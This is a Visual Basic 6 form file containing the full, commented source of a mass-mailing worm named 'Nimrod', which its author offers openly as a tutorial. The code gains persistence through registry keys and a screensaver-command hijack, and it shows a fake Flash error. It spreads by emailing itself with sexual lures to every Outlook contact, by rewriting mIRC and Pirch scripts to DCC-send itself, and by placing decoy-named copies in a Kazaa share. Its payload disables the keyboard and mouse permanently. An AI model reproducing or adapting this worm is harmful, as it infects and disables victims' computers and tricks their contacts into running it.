VERSION 5.00
Begin VB.Form frmNimrod 
   BorderStyle     =   0  'None
   Caption         =   "Form1"
   ClientHeight    =   90
   ClientLeft      =   -3870
   ClientTop       =   3825
   ClientWidth     =   90
   ClipControls    =   0   'False
   ControlBox      =   0   'False
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   90
   ScaleWidth      =   90
   ShowInTaskbar   =   0   'False
   Visible         =   0   'False
End
Attribute VB_Name = "frmNimrod"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
' <<<<<<>>>>>><<<<<<>>>>>><<<<<<>>>>>><<<<<<>>>>>><<<<<<>>>>>><<<<<<>>>>>>
' Hello VB Coders,
' This is a basic VB6 worm that uses Kazaa, Pirch, Mirc and
' Microsoft Outlook to propagate itself.
'
' This tutorial worm named 'Nimrod' does the following:
'
' • Copies itself to C:%System%\FlashMovie.exe
' • Installs itself into the registry as 'HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Swf32="C:%System%\FlashMovie.exe"', so it runs with every system start.
' • Writes an additional registry key: 'HKEY_CLASSES_ROOT\scrfile\shell\open\command\="C:%System%\FlashMovie.exe"', so that the worm overrides the ScreenSaver command - so when the system runs a screen saver, the worm is executed instead.
' • Displays the fake error message 'MacroMedia Shockwave Flash is not installed!', on the first run, so the user thinks that the file is a dud.
' • It will also locate and copy itself to the Startup folder, so it runs with every system start.
' • The worm will also copy itself to the %Windows%, %System% and %Temp% folders as 'Jdbgmgr.exe', Thus overriding the original Jdbgmgr.exe file (I did this because the W32.Magistr worm includes Jdbgmgr.exe as an attachment aswell as itself in an outgoing email, and another reason is to create a few more backup copies).
' • Emails itself once to all contacts in the address book
' • The worm then attempts to propagate itself through Mirc, Pirch and Kazaa.
' • And finally, for the worms payload, on the 16th of every month it displays the message 'Gimme a Compact-Disc to eat', and opens the CD tray, and then disables the mouse and keyboard.
'
' Any commments, questions or bugs with this code,
' don't hesitate to email me at: forest_green282@hotmail.com
'
'
' Well thats about it for the intoduction, look below
' learn the worms code, spread methods, etc...
'
' Also, the worm ource code below is commented :)
'
' <<<<<<>>>>>><<<<<<>>>>>><<<<<<>>>>>><<<<<<>>>>>><<<<<<>>>>>><<<<<<>>>>>>

Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long ' The CD Tray object (so the worm can open the CD Tray).
Private Sub Form_Load()
On Error Resume Next ' A basic error handler.
' -------------------------------------------------------------------------------------
Dim AppPath As String
AppPath = App.Path
If Right(AppPath, 1) <> "\" Then AppPath = AppPath & "\" ' Locate the worms' location - so it can make multiple copies of itself :)
Set fso = CreateObject("Scripting.FileSystemObject") ' The FileSystem thingo - the worm just uses this to locate the %Windows%, %System% or %Temp% directories.
Set wsc = CreateObject("WScript.Shell") ' The WSHShell thingo - the worm uses this to locate the %Startup% folder, and to write keys to the registry.
WormFullName = AppPath & App.EXEName & ".EXE" ' THe worms full path.
' -------------------------------------------------------------------------------------
If Dir(fso.GetSpecialFolder(1) & "\FlashMovie.exe") <> "FlashMovie.exe" Then ' Check to see if the worm is installed.
FileCopy WormFullName, fso.GetSpecialFolder(1) & "\FlashMovie.exe" ' If the worm isn't installed, install it :)
wsc.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Swf32", fso.GetSpecialFolder(1) & "\FlashMovie.exe" ' Write a registry key so the worm will run at every system start.
wsc.RegWrite "HKEY_CLASSES_ROOT\scrfile\shell\open\command\", fso.GetSpecialFolder(1) & "\FlashMovie.exe" ' Write another registry key so that the worm overrides the ScreenSaver command - so when the system runs a screen saver, the worm is executed instead.
MsgBox "MacroMedia Shockwave Flash is not installed!", vbCritical, "Error" ' Just a fake error message :)
Else
If Day(Now) = 16 Then ' On the 16th, the payload is triggered :)
MsgBox "Gimme a Compact-Disc to eat", vbSystemModal + vbExclamation, "Nimrod by Zed/[rRlf]"
mciSendString "Set CDAudio Door Open Wait", 0&, 0&, 0& ' Open the CD Tray :)
wsc.Run "Rundll32.exe Keyboard,Disable" ' Disable the keyboard
wsc.Run "Rundll32.exe Mouse,Disable" ' Disable the mouse
wsc.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Nimrod_Keyboard", "Rundll32.exe Keyboard,Disable" ' Disable the keyboard in the registry, so that the keyboard will always be disabled until this registry value is deleted.
wsc.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Nimrod_Mouse", "Rundll32.exe Mouse,Disable" ' Disable the mouse in the registry, so that the mouse will always be disabled until this registry value is deleted.
End If
End If
' -------------------------------------------------------------------------------------
If Dir(wsc.SpecialFolders("Startup") & "\Shockwave.exe") <> "Shockwave.exe" Then
FileCopy WormFullName, wsc.SpecialFolders("Startup") & "\Shockwave.exe" ' If the worm doesn't exist in the Startup directory, copy the worm to the startup directory :)
End If
' -------------------------------------------------------------------------------------
FileCopy WormFullName, fso.GetSpecialFolder(0) & "\Jdbgmgr.exe"
FileCopy WormFullName, fso.GetSpecialFolder(1) & "\Jdbgmgr.exe" ' Create a few backup copies of the worm, and also override the original Jdbgmgr.exe file :)
FileCopy WormFullName, fso.GetSpecialFolder(2) & "\Jdbgmgr.exe"
' -------------------------------------------------------------------------------------
If Dir(fso.GetSpecialFolder(1) & "\FlashMovie.txt") <> "FlashMovie.txt" Then ' Send the worm to everyone in the Outlook Address Book (Only once).
Set OutlookApp = CreateObject("Outlook.Application")
Set GNS = OutlookApp.GetNameSpace("MAPI")
For List1 = 1 To GNS.AddressLists.Count
CountLoop = 1
For ListCount = 1 To GNS.AddressLists(List1).AddressEntries.Count
Set OutlookEmail = OutlookApp.CreateItem(0)
OutlookEmail.Recipients.Add (GNS.AddressLists(List1).AddressEntries(CountLoop))
Randomize
RndNumber = Int((6 * Rnd) + 1)
Select Case RndNumber
Case 1: RndText = "Have a look at this Shockwave video of me and my lover ;)" & vbCrLf _
& "" & vbCrLf _
& "Bye."
Case 2: RndText = "Check out these hot teenage girls in this flash video..." & vbCrLf _
& "Email me back and tell me what you think ;)" & vbCrLf _
& "" & vbCrLf _
& "Bye."
Case 3: RndText = "Have a look at this Shockwave video... I know you like these kinds of movies ;)" & vbCrLf _
& "" & vbCrLf _
& "Bye."
Case 4: RndText = "Have a look at this dancing girls Shockwave video..." & vbCrLf _
& "I know you'll like it ;)" & vbCrLf _
& "" & vbCrLf _
& "Bye."
Case 5: RndText = "What do you think of this Shockwave video with the hottest girl that I have ever seen?" & vbCrLf _
& "Email me back and tell me what you think ;)" & vbCrLf _
& "" & vbCrLf _
& "Bye."
Case 6: RndText = "Check out this Shockwave video... I know you'll enjoy it ;)" & vbCrLf _
& "" & vbCrLf _
& "Bye."
End Select
OutlookEmail.Subject = "Check this out!"
OutlookEmail.Body = RndText
OutlookEmail.Attachments.Add (fso.GetSpecialFolder(1) & "\FlashMovie.exe")
OutlookEmail.DeleteAfterSubmit = True
OutlookEmail.Importance = 2
OutlookEmail.Send
CountLoop = CountLoop + 1
Next
Next
End If
' -------------------------------------------------------------------------------------
Open fso.GetSpecialFolder(1) & "\FlashMovie.txt" For Output As 1
Print #1, "W32/Nimrod.A by Zed/[rRlf]"
Close 1
' -------------------------------------------------------------------------------------
If Dir("C:\Mirc32\Mirc.ini") = "Mirc.ini" Then mIRCPath = "C:\Mirc32" ' Find the Mirc folder path
If Dir("C:\Mirc\Mirc.ini") = "Mirc.ini" Then mIRCPath = "C:\Mirc"
If Dir(wsc.SpecialFolders("Programs") & "\Mirc\Mirc.ini") = "Mirc.ini" Then mIRCPath = wsc.SpecialFolders("Programs") & "\Mirc"
If Dir(wsc.SpecialFolders("Programs") & "\Mirc32\Mirc.ini") = "Mirc.ini" Then mIRCPath = wsc.SpecialFolders("Programs") & "\Mirc32"
If mIRCPath <> "" Then ' If Mirc is installed in any of the locations above, the worm will then edit the Script.ini file to send itself through Mirc :)
' -------------------------------------------------------------------------------------
If Dir(mIRCPath & "\FlashMovie.ex_") <> "FlashMovie.ex_" Then
FileCopy WormFullName, mIRCPath & "\FlashMovie.ex_"
End If
' -------------------------------------------------------------------------------------
Open mIRCPath & "\script.ini" For Output As 2
Print #2, "[script]"
Print #2, "n5= on 1:JOIN:#:{"
Print #2, "n6= /if ( $nick == $me ) { halt }"
Print #2, "n7= /msg $nick Have a look at this flash movie ;) - If it doesn't work, rename it to SWF.exe"
Print #2, "n8= /dcc send -c $nick " & mIRCPath & "\FlashMovie.ex_"
Print #2, "n9= }"
Close 2
End If
' -------------------------------------------------------------------------------------
If Dir("C:\Pirch32\Pirch32.exe") = "Pirch32.exe" Then PirchPath = "C:\Pirch32" ' Find the Pirch folder path
If Dir("C:\Pirch\Pirch32.exe") = "Pirch32.exe" Then PirchPath = "C:\Pirch"
If Dir(wsc.SpecialFolders("Programs") & "\Pirch\Pirch32.exe") = "Pirch32.exe" Then PirchPath = wsc.SpecialFolders("Programs") & "\Pirch"
If Dir(wsc.SpecialFolders("Programs") & "\Pirch32\Pirch32.exe") = "Pirch32.exe" Then PirchPath = wsc.SpecialFolders("Programs") & "\Pirch32"
' -------------------------------------------------------------------------------------
If PirchPath <> "" Then ' If Pirch is installed in any of the locations above, the worm will then edit the Events.ini file to send itself through Pirch :)
' -------------------------------------------------------------------------------------
If Dir(PirchPath & "\FlashMovie.ex_") <> "FlashMovie.ex_" Then
FileCopy WormFullName, PirchPath & "\FlashMovie.ex_"
End If
' -------------------------------------------------------------------------------------
Open PirchPath & "\events.ini" For Output As 3
Print #3, "[Levels]"
Print #3, "Enabled=1"
Print #3, "Count=6"
Print #3, "Level1=000-Unknowns"
Print #3, "000-UnknownsEnabled=1"
Print #3, "Level2=100-Level 100"
Print #3, "100-Level 100Enabled=1"
Print #3, "Level3=200-Level 200"
Print #3, "200-Level 200Enabled=1"
Print #3, "Level4=300-Level 300"
Print #3, "300-Level 300Enabled=1"
Print #3, "Level5=400-Level 400"
Print #3, "400-Level 400Enabled=1"
Print #3, "Level6=500-Level 500"
Print #3, "500-Level 500Enabled=1"
Print #3, ""
Print #3, "[000-Unknowns]"
Print #3, "UserCount=0"
Print #3, "Event1=ON JOIN:#:/msg $nick Have a look at this flash movie ;) - If it doesn't work, rename it to SWF.exe"
Print #3, "EventCount=0"
Print #3, ""
Print #3, "[100-Level 100]"
Print #3, "User1=*!*@*"
Print #3, "UserCount=1"
Print #3, "Event1=ON JOIN:#:/dcc send $nick " & PirchPath & "\FlashMovie.ex_"
Print #3, "EventCount=1"
Print #3, ""
Print #3, "[200-Level 200]"
Print #3, "UserCount=0"
Print #3, "EventCount=0"
Print #3, ""
Print #3, "[300-Level 300]"
Print #3, "UserCount=0"
Print #3, "EventCount=0"
Print #3, ""
Print #3, "[400-Level 400]"
Print #3, "UserCount=0"
Print #3, "EventCount=0"
Print #3, ""
Print #3, "[500-Level 500]"
Print #3, "UserCount=0"
Print #3, "EventCount=0"
Close 3
End If
' -------------------------------------------------------------------------------------
If Dir("C:\Kazaa\Kazaa.exe") = "Kazaa.exe" Or Dir(wsc.SpecialFolders("Programs") & "\Kazaa\Kazaa.exe") = "Kazaa.exe" Then ' Check to see if Kazaa exists on the computer.
MkDir fso.GetSpecialFolder(1) & "\KazaaShared" ' If Kazaa exists, the worm with then create a 'Secret' shared folder, to share itself through Kazaa :)
KazaaShared = fso.GetSpecialFolder(1) & "\KazaaShared\"
FileCopy WormFullName, KazaaShared & "Virtual Sex Simulator.exe"
FileCopy WormFullName, KazaaShared & "Shockwave Flash.exe"
FileCopy WormFullName, KazaaShared & "SWF_Movie.exe"
FileCopy WormFullName, KazaaShared & "FlashMovie.exe"
FileCopy WormFullName, KazaaShared & "XXX video.exe"
FileCopy WormFullName, KazaaShared & "Cat attacks child.exe"
FileCopy WormFullName, KazaaShared & "SWF.exe"
FileCopy WormFullName, KazaaShared & "Comedy video.exe"
FileCopy WormFullName, KazaaShared & "Simpsons Episode (#" & Second(Now) & ").exe"
FileCopy WormFullName, KazaaShared & "Tutorial Video on Hacking.exe"
FileCopy WormFullName, KazaaShared & "MacroMedia Flash 6.0.exe"
FileCopy WormFullName, KazaaShared & "[SWF] - The Fast and the Furious.exe"
FileCopy WormFullName, KazaaShared & "[SWF] - Swordfish.exe"
FileCopy WormFullName, KazaaShared & "[SWF] - Harry Potter and the philosophers stone.exe"
FileCopy WormFullName, KazaaShared & "[SWF] - Jurassic Park 3.exe"
FileCopy WormFullName, KazaaShared & App.EXEName & ".exe"
wsc.RegWrite "HKEY_CURRENT_USER\Software\Kazaa\Transfer\DlDir1", fso.GetSpecialFolder(1) & "\KazaaShared" ' Write a registry key so that the 'Secret' shared folder is a Kazaa shared folder :)
End If
' -------------------------------------------------------------------------------------
For Each dc In fso.Drives ' Map all fixed or network drives (Except drive C).
If dc.DriveType = 2 Or dc.DriveType = 3 Then
If UCase(dc.Path) <> "C:" Then
If dc.IsReady Then
If Dir(dc.Path & "\SWF_Movie.exe") <> "SWF_Movie.exe" Then ' Check to see if a worm copy exists on the drive.
FileCopy WormFullName, dc.Path & "\SWF_Movie.exe" ' If a copy of the worm doesn't exist, copy the worm to the drive :)
End If
End If
End If
End If
Next
wsc.RegWrite "HKEY_CURRENT_USER\Software\Nimrod\1.0\", "Nimrod by Zed/[rRlf]"
' -------------------------------------------------------------------------------------
End Sub

' <<<<<<>>>>>><<<<<<>>>>>><<<<<<>>>>>><<<<<<>>>>>><<<<<<>>>>>><<<<<<>>>>>>
' Alternative:
' Well, I hope that you have learnt something from this worm
' source code.
'
' That's all the coding im doing for now,
'
'
' Zed/[rRlf]
'
' (forest_green282@hotmail.com)
'
' <<<<<<>>>>>><<<<<<>>>>>><<<<<<>>>>>><<<<<<>>>>>><<<<<<>>>>>><<<<<<>>>>>>
